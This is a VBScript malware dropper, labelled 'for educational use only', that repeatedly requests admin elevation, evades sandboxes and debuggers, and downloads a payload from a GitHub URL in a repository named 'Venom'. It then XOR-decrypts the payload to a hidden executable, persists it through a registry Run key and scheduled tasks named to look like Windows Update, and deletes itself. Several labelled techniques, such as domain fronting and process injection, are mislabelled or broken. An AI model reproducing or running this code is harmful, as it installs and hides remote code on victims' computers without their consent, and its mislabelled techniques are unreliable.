'# @title Advanced Silent Downloader with Persistence
'# @description Combines domain fronting, encryption, sandbox evasion, admin escalation, and process injection
'# @warning FOR LEGAL/EDUCATIONAL USE ONLY

Option Explicit
On Error Resume Next

' ============= CONFIGURATION =============
Const MAX_ELEVATION_ATTEMPTS = 5
Const PAYLOAD_URL = "https://cdn.example.com/static/logo.png"  ' Domain-fronted URL
Const REAL_HOST = "https://raw.githubusercontent.com/P0k3m0n-unleashed/ProjSucc/refs/heads/master/Venom/initial1.cmd"                     ' Actual C2 host
Const XOR_KEY = "v3ryS3cr3tK3y!"                              ' 128-bit XOR key
Const IDLE_TIMEOUT = 120000                                    ' 2 min idle check
' =========================================

' Core objects
Dim shell, fso, wmi
Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set wmi = GetObject("winmgmts:\\.\root\cimv2")

' Main execution flow
ExecuteSilently
If Not CheckAdminPrivileges(MAX_ELEVATION_ATTEMPTS) Then SelfDestruct()

Dim payloadPath, decryptedPath
payloadPath = BuildTempPath(".dat")
decryptedPath = BuildTempPath(".exe")

' Anti-analysis checks
If IsSandboxed() Or IsDebugging() Then SelfDestruct()

' Domain-fronted download
If Not DownloadWithDomainFronting(PAYLOAD_URL, REAL_HOST, payloadPath) Then SelfDestruct()

' Decrypt and execute
If XorDecryptFile(payloadPath, decryptedPath, XOR_KEY) Then
    SetHiddenAttributes decryptedPath
    AddPersistence decryptedPath
    ProcessInjection decryptedPath
End If

SelfDestruct()

' ============= CORE FUNCTIONS =============
Sub ExecuteSilently()
    If InStr(1, WScript.FullName, "wscript.exe") = 0 Then
        shell.Run "wscript.exe """ & WScript.ScriptFullName & """", 0, False
        WScript.Quit
    End If
End Sub

Function CheckAdminPrivileges(maxAttempts)
    Dim attempts, isElevated
    attempts = 0
    isElevated = False
    
    Do Until isElevated Or attempts >= maxAttempts
        isElevated = IsAdmin()
        If Not isElevated Then
            attempts = attempts + 1
            ElevatePermissions attempts, maxAttempts
            WaitForElevation IDLE_TIMEOUT
        End If
    Loop
    
    CheckAdminPrivileges = isElevated
End Function

Function IsAdmin()
    On Error Resume Next
    fso.GetFile(shell.ExpandEnvironmentStrings("%WinDir%\System32\config\systemprofile")).Attributes = 0
    IsAdmin = (Err.Number = 0)
    Err.Clear
End Function

Sub ElevatePermissions(attempt, maxAttempts)
    Dim uacMethod, args
    args = """" & WScript.ScriptFullName & """ " & attempt
    
    Select Case attempt
        Case 1: uacMethod = "runas"  ' Standard UAC
        Case 2: uacMethod = "open"   ' Less suspicious
        Case Else: uacMethod = "runasuser" ' Final attempt
    End Select
    
    CreateObject("Shell.Application").ShellExecute "wscript.exe", args, "", uacMethod, 0
    CreateRetryScript attempt, maxAttempts
    WScript.Quit
End Sub

Sub WaitForElevation(timeout)
    Dim startTime
    startTime = Timer
    Do While Timer < startTime + (timeout / 1000)
        WScript.Sleep 5000
        If IsAdmin() Then Exit Do
    Loop
End Sub

Function DownloadWithDomainFronting(url, hostHeader, dest)
    Dim xhr, stream
    Set xhr = CreateObject("MSXML2.ServerXMLHTTP.6.0")
    Set stream = CreateObject("ADODB.Stream")
    
    xhr.Open "GET", url, False
    xhr.setRequestHeader "Host", hostHeader
    xhr.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT; compatible)")
    xhr.Send
    
    If xhr.Status = 200 Then
        stream.Type = 1
        stream.Open
        stream.Write xhr.ResponseBody
        stream.SaveToFile dest, 2
        stream.Close
        DownloadWithDomainFronting = True
    Else
        DownloadWithDomainFronting = False
    End If
End Function

Function XorDecryptFile(src, dest, key)
    Dim content, decrypted, i, keyIndex
    On Error Resume Next
    
    With fso.OpenTextFile(src, 1, False)
        content = .ReadAll
        .Close
    End With
    
    keyIndex = 1
    For i = 1 To Len(content)
        decrypted = decrypted & Chr(Asc(Mid(content, i, 1)) Xor Asc(Mid(key, keyIndex, 1)))
        keyIndex = (keyIndex Mod Len(key)) + 1
    Next
    
    With fso.CreateTextFile(dest, True)
        .Write decrypted
        .Close
    End With
    
    XorDecryptFile = (Err.Number = 0)
End Function

Sub ProcessInjection(exePath)
    shell.Run "schtasks /create /tn ""WindowsUpdateTask"" /tr """ & exePath & """ /sc onlogon /f", 0, True
    shell.Run "wmic process call create """ & exePath & """", 0, False
End Sub

Sub AddPersistence(exePath)
    ' Registry persistence
    shell.RegWrite "HKLM\Software\Microsoft\Windows\CurrentVersion\Run\" & GenerateRandomName(), exePath, "REG_SZ"
    
    ' WMI event subscription
    Dim wmiEvent
    wmiEvent = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_LogonSession'"
    shell.Run "schtasks /create /tn ""WindowsUpdate"" /tr """ & exePath & """ /sc onlogon /f", 0, True
End Sub

Function IsSandboxed()
    Dim cpuCores, totalRAM, gpuPresent
    cpuCores = wmi.ExecQuery("Select * from Win32_Processor").ItemIndex(0).NumberOfCores
    totalRAM = wmi.ExecQuery("Select * from Win32_ComputerSystem").ItemIndex(0).TotalPhysicalMemory / 1073741824 ' GB
    
    On Error Resume Next
    gpuPresent = (wmi.ExecQuery("Select * from Win32_VideoController").Count > 0)
    
    IsSandboxed = (cpuCores < 2) Or (totalRAM < 2) Or (Not gpuPresent) Or _
                 (InStr(1, shell.ExpandEnvironmentStrings("%PROCESSOR_IDENTIFIER%"), "VMWARE", vbTextCompare) > 0)
End Function

Function IsDebugging()
    On Error Resume Next
    Dim processList
    Set processList = wmi.ExecQuery("Select * from Win32_Process Where Name LIKE '%ollydbg%' OR Name LIKE '%wireshark%'")
    IsDebugging = (processList.Count > 0)
End Function

Function BuildTempPath(extension)
    BuildTempPath = shell.ExpandEnvironmentStrings("%TEMP%\" & GenerateRandomName(extension))
End Function

Function GenerateRandomName(extension)
    Dim chars, i
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    Randomize
    
    For i = 1 To 12
        GenerateRandomName = GenerateRandomName & Mid(chars, Int((Len(chars) * Rnd) + 1), 1)
    Next
    
    GenerateRandomName = GenerateRandomName & extension
End Function

Sub SetHiddenAttributes(path)
    On Error Resume Next
    fso.GetFile(path).Attributes = 2 + 4  ' Hidden + System
    shell.Run "attrib +h +s +r """ & path & """", 0, True
End Sub

Sub SelfDestruct()
    Dim batPath, batCode
    batPath = BuildTempPath(".bat")
    
    batCode = "@echo off" & vbCrLf & _
              "timeout /t 3 /nobreak >nul" & vbCrLf & _
              "del """ & WScript.ScriptFullName & """ /f /q" & vbCrLf & _
              "del """ & batPath & """ /f /q"
    
    With fso.CreateTextFile(batPath, True)
        .Write batCode
        .Close
    End With
    
    shell.Run batPath, 0, False
    WScript.Quit
End Sub